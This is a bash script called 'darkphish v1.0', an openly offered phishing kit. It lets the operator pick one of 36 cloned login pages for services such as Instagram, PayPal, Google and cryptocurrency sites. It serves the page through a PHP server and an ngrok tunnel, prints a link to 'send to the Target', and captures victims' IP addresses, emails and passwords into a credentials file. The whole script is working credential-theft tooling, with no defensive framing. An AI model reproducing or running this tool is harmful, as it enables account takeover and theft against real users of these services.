#!/bin/bash
# darkphish v1.0
# color
# Reset
clear='\033[0m'       # Text Reset

# Regular Colors
Black='\033[0;30m'        # Black
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
White='\033[0;37m'        # White

# Bold
BBlack='\033[1;30m'       # Black
BRed='\033[1;31m'         # Red
BGreen='\033[1;32m'       # Green
BYellow='\033[1;33m'      # Yellow
BBlue='\033[1;34m'        # Blue
BPurple='\033[1;35m'      # Purple
BCyan='\033[1;36m'        # Cyan
BWhite='\033[1;37m'       # White

# Underline
UBlack='\033[4;30m'       # Black
URed='\033[4;31m'         # Red
UGreen='\033[4;32m'       # Green
UYellow='\033[4;33m'      # Yellow
UBlue='\033[4;34m'        # Blue
UPurple='\033[4;35m'      # Purple
UCyan='\033[4;36m'        # Cyan
UWhite='\033[4;37m'       # White


# Check if root
if [ "$EUID" -ne 0 ]
  then
      printf "${Red}Opps! ${BGreen}'sudo' ${Red}Please!\n"
  exit
fi
trap 'printf "\n";stop;exit 1' 2

# dependencies
dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "${Red}I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "${Red}I require wget but it's not installed. Install it. Aborting."; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "${Red}I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "${Red}I require curl but it's not installed. Install it. Aborting."; exit 1; }

}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

}

# banner
banner() {
clear
printf "${BBlack} ____             _   ${BRed} ____  _     _     _                \n"
printf "${BBlack}|  _ \  __ _ _ __| | _${BRed}|  _ \| |__ (_)___| |__   ___ _ __  \n"
printf "${BBlack}| | | |/ _  |  __| |/ ${BRed}/ |_) | '_ \| / __| '_ \ / _ \ '__| \n"
printf "${BBlack}| |_| | (_| | |  |   <${BRed}|  __/| | | | \__ \ | | |  __/ |    \n"
printf "${BBlack}|____/ \__ _|_|  |_|\_${BRed}\_|   |_| |_|_|___/_| |_|\___|_|    \n"
printf "      ${URed}${BRed}The Dark Side of Social Enginnering Attack!   ${clear}\n"
echo ""
printf "                                           ${BGreen}by: JohnSmith \n"
printf "==========================================================\n"
printf "${clear}\n"
}

menu() {
printf "${BGreen}[${UWhite}01${clear}]${BGreen} Instagram     [${UWhite}11${clear}]${BGreen} Steam              [${UWhite}21${clear}]${BGreen} Verizon       [${UWhite}31${clear}]${BGreen} Yandex\n"
printf "${BGreen}[${UWhite}02${clear}]${BGreen} Facebook      [${UWhite}12${clear}]${BGreen} Yahoo              [${UWhite}22${clear}]${BGreen} DropBox       [${UWhite}32${clear}]${BGreen} devianART\n"
printf "${BGreen}[${UWhite}03${clear}]${BGreen} Snapchat      [${UWhite}13${clear}]${BGreen} Linkedin           [${UWhite}23${clear}]${BGreen} Adove ID      [${UWhite}33${clear}]${BGreen} Animated Dream (added new site)\n"
printf "${BGreen}[${UWhite}04${clear}]${BGreen} Twitter       [${UWhite}14${clear}]${BGreen} ProtonMail         [${UWhite}24${clear}]${BGreen} Shopify       [${UWhite}34${clear}]${BGreen} Genyo (Added)\n"
printf "${BGreen}[${UWhite}05${clear}]${BGreen} Github        [${UWhite}15${clear}]${BGreen} WordPress          [${UWhite}25${clear}]${BGreen} Messenger     [${UWhite}35${clear}]${BGreen} Lazada (Added)\n"
printf "${BGreen}[${UWhite}06${clear}]${BGreen} Google        [${UWhite}16${clear}]${BGreen} Microsoft          [${UWhite}26${clear}]${BGreen} GitLab        [${UWhite}36${clear}]${BGreen} Shopee (Added)\n"
printf "${BGreen}[${UWhite}07${clear}]${BGreen} Spotify       [${UWhite}17${clear}]${BGreen} IGFollowers        [${UWhite}27${clear}]${BGreen} Twitch        [${UWhite}99${clear}]${BRed} Exit${clear}\n"
printf "${BGreen}[${UWhite}08${clear}]${BGreen} Netflix       [${UWhite}18${clear}]${BGreen} eBay               [${UWhite}28${clear}]${BGreen} MySpace       \n"
printf "${BGreen}[${UWhite}09${clear}]${BGreen} Paypal        [${UWhite}19${clear}]${BGreen} Pinterest          [${UWhite}29${clear}]${BGreen} Badoo         \n"
printf "${BGreen}[${UWhite}10${clear}]${BGreen} Origin        [${UWhite}20${clear}]${BGreen} CryptoCurrency     [${UWhite}30${clear}]${BGreen} VK            \n"
printf "${Blue}"
echo ""
read -p "Option: " option


if [[ $option == 1 || $option == 01 ]]; then
site="instagram"
start1

elif [[ $option == 2 || $option == 02 ]]; then
site="facebook"
start1
elif [[ $option == 3 || $option == 03 ]]; then
site="snapchat"
start1
elif [[ $option == 4 || $option == 04 ]]; then
site="twitter"
start1
elif [[ $option == 5 || $option == 05 ]]; then
site="github"
start1
elif [[ $option == 6 || $option == 06 ]]; then
site="google"
start1

elif [[ $option == 7 || $option == 07 ]]; then
site="spotify"
start1

elif [[ $option == 8 || $option == 08 ]]; then
site="netflix"
start1

elif [[ $option == 9 || $option == 09 ]]; then
site="paypal"
start1

elif [[ $option == 10 ]]; then
site="origin"
start1

elif [[ $option == 11 ]]; then
site="steam"
start1

elif [[ $option == 12 ]]; then
site="yahoo"
start1

elif [[ $option == 13 ]]; then
site="linkedin"
start1

elif [[ $option == 14 ]]; then
site="protonmail"
start1

elif [[ $option == 15 ]]; then
site="wordpress"
start1

elif [[ $option == 16 ]]; then
site="microsoft"
start1

elif [[ $option == 17 ]]; then
site="instafollowers"
start1

elif [[ $option == 18 ]]; then
site="shopping"
start1

elif [[ $option == 19 ]]; then
site="pinterest"
start1

elif [[ $option == 20 ]]; then
site="cryptocurrency"
start1

elif [[ $option == 21 ]]; then
site="verizon"
start1

elif [[ $option == 22 ]]; then
site="dropbox"
start1

elif [[ $option == 23 ]]; then
site="adobe"
start1

elif [[ $option == 24 ]]; then
site="shopify"
start1

elif [[ $option == 25 ]]; then
site="messenger"
start1

elif [[ $option == 26 ]]; then
site="gitlab"
start1

elif [[ $option == 27 ]]; then
site="twitch"
start1

elif [[ $option == 28 ]]; then
site="myspace"
start1

elif [[ $option == 29 ]]; then
site="badoo"
start1

elif [[ $option == 30 ]]; then
site="vk"
start1

elif [[ $option == 31 ]]; then
site="yandex"
start1

elif [[ $option == 32 ]]; then
site="devianart"
start1

elif [[ $option == 33 ]]; then
site="Animated"
start1

elif [[ $option == 34 ]]; then
site="genyo"
start1

elif [[ $option == 35 ]]; then
site="lazada"
start1

elif [[ $option == 36 ]]; then
site="shopee"
start1

elif [[ $option == 99 ]]; then
exit 1

else
printf "${BRed}[!] Invalid option!${clear}\n"
sleep 1
clear
banner
menu
fi

}


catch_cred() {
account=$(grep -o 'Account:.*' webpage/$site/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' webpage/$site/usernames.txt | cut -d ":" -f2)
printf "${BRed}Got the Email: ${White}%s\n\e[0m" $account
printf "${BRed}Got the Password: ${White}%s\n\e[0m" $password
printf "Website: $site \n\n" >> webpage/credentials.txt
cat webpage/$site/ip.txt | grep IP >> webpage/credentials.txt
cat webpage/$site/usernames.txt >> webpage/credentials.txt
echo "==================================" >> webpage/credentials.txt
printf "${UGreen}Saved: ${White}webpage/credentials.txt\e[0m\n"
printf "\n"
printf "${BYellow}Warning...\n${BRed}About to Close!\n"
sleep 20
killall -2 php > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
killall ssh > /dev/null 2>&1
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
exit 1

}

getcredentials() {
printf "${Yellow}Waiting credentials ...\e[0m\n"
while [ true ]; do


if [[ -e "webpage/$site/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
catch_cred

fi
sleep 1
done 


}

catch_ip() {

getcredentials

}


start() {
if [[ -e webpage/$site/ip.txt ]]; then
rm -rf webpage/$site/ip.txt

fi
if [[ -e webpage/$site/usernames.txt ]]; then
rm -rf webpage/$site/usernames.txt

fi


printf "${Blue}Starting php server...\n"
cd webpage/$site && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 3
printf "${BGreen}OK.${clear}\n"
printf "${Blue}Starting ngrok server...\n"
ngrok http 3333 > /dev/null 2>&1 &
sleep 10
printf "${BGreen}OK.${clear}\n"

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "${Yellow}Send this link to the Target:${BRed} %s\e[0m\n" $link
printf "\n"

checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

banner
printf "${BYellow}\n"
printf "Please Wait!${BRed}"
printf "."
sleep 0.5
printf "."
printf "."
sleep 0.5
printf "."
sleep 0.5 
printf "."
sleep 0.5
printf "."
sleep 0.5
printf "."
printf "." 
printf "."
sleep 0.5
printf "."
sleep 0.5
printf "."
printf "." 
printf "."
sleep 0.5
printf "."
sleep 0.5
printf "."
sleep 0.5
printf "."
sleep 0.5
printf "."
printf "." 
printf "."
sleep 0.5
printf "."
sleep 0.5
printf "."
printf "." 
printf "."
sleep 0.5
printf "."
sleep 0.5
printf "."
sleep 0.5
printf "."
sleep 0.5
printf ".\n"
start


}

checkfound() {

printf "\n"
printf "${BRed}Waiting for Possible Credentials ...\n"
while [ true ]; do

if [[ -e "webpage/$site/ip.txt" ]]; then
printf "${Green}IP Found!\n"
catch_ip
rm -rf webpage/$site/ip.txt
fi
sleep 0.5
if [[ -e "webpage/$site/usernames.txt" ]]; then
printf "${Green}Credentials Found!\n"
catch_cred
rm -rf webpage/$site/usernames.txt
fi
sleep 0.5
done 

}
banner
dependencies
menu